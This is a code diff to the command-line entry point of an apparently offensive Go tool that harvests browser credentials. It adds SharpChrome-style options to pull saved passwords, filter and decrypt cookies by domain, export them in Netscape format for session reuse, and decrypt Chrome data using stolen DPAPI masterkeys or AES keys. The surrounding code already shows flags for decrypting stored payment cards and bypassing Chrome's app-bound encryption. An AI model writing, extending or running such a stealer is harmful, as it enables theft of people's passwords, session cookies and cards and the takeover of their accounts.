@@ -27,6 +27,15 @@ func main() {
 	exclude := flag.String("exclude", "", "Comma-separated paths to exclude (e.g. TikTok,Discord)")
 	decryptBrowsers := flag.Bool("decrypt-browsers", false, "Inline-decrypt browser passwords/cookies/cards (requires -tags decrypt build)")
 	chromeV20 := flag.Bool("chrome-v20-experimental", false, "EXPERIMENTAL: attempt Chrome v127+ app-bound key bypass via IElevator COM (may crash on some Chrome builds)")
+
+	// SharpChrome-equivalent flags
+	browserFlag := flag.String("browser", "", "Only scan specific browser(s), comma-separated (e.g. chrome,firefox,edge,brave)")
+	domainFlag := flag.String("domain", "", "Filter cookies by domain substring (e.g. google.com, .office.com)")
+	loginsOnly := flag.Bool("logins-only", false, "Only extract saved browser passwords, skip everything else")
+	cookiesOut := flag.String("cookies-out", "", "Export decrypted cookies in Netscape format (e.g. -cookies-out cookies.txt)")
+	chromeKey := flag.String("chrome-key", "", "Pre-decrypted Chrome AES key as hex (remote DPAPI — use after offline masterkey decrypt)")
+	dpapiMK := flag.String("dpapi-masterkey", "", "DPAPI masterkey as hex (from secretsdump/pypykatz) — auto-decrypts Chrome Local State blob")
+
 	flag.Parse()
 
 	if !*quiet {
@@ -47,6 +56,42 @@ func main() {
 		decrypt.EnableAppBoundV20()
 		fmt.Fprintln(os.Stderr, "[!] Chrome v20 app-bound bypass ENABLED (experimental — may crash)")
 	}
+
+	// SharpChrome-equivalent features
+	if *browserFlag != "" {
+		scanner.BrowserFilter = strings.Split(*browserFlag, ",")
+	}
+	if *domainFlag != "" {
+		scanner.DomainFilter = *domainFlag
+		scanner.DecryptBrowsers = true // domain filter only applies to decrypted cookies
+		if !decrypt.Enabled() {
+			fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
+		}
+	}
+	if *loginsOnly {
+		scanner.LoginsOnly = true
+		scanner.DecryptBrowsers = true
+		if !decrypt.Enabled() {
+			fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
+		}
+	}
+	if *chromeKey != "" {
+		if err := decrypt.SetExternalChromiumKey(*chromeKey); err != nil {
+			fmt.Fprintf(os.Stderr, "[!] -chrome-key: %v\n", err)
+			os.Exit(1)
+		}
+		scanner.DecryptBrowsers = true
+		fmt.Fprintf(os.Stderr, "[*] Remote DPAPI: using provided Chrome AES key\n")
+	}
+	if *dpapiMK != "" {
+		if err := decrypt.SetDPAPIMasterKey(*dpapiMK); err != nil {
+			fmt.Fprintf(os.Stderr, "[!] -dpapi-masterkey: %v\n", err)
+			os.Exit(1)
+		}
+		scanner.DecryptBrowsers = true
+		fmt.Fprintf(os.Stderr, "[*] Remote DPAPI: will derive Chrome key from Local State blob using provided masterkey\n")
+	}
+
 	results := scanner.Run()
 
 	if *highOnly {
@@ -57,6 +102,11 @@ func main() {
 			}
 		}
 		results = filtered
+	}
+
+	// Netscape cookie export
+	if *cookiesOut != "" {
+		harvest.OutputNetscape(results, *cookiesOut)
 	}
 
 	// Determine output file from -o flag (auto-detect format)
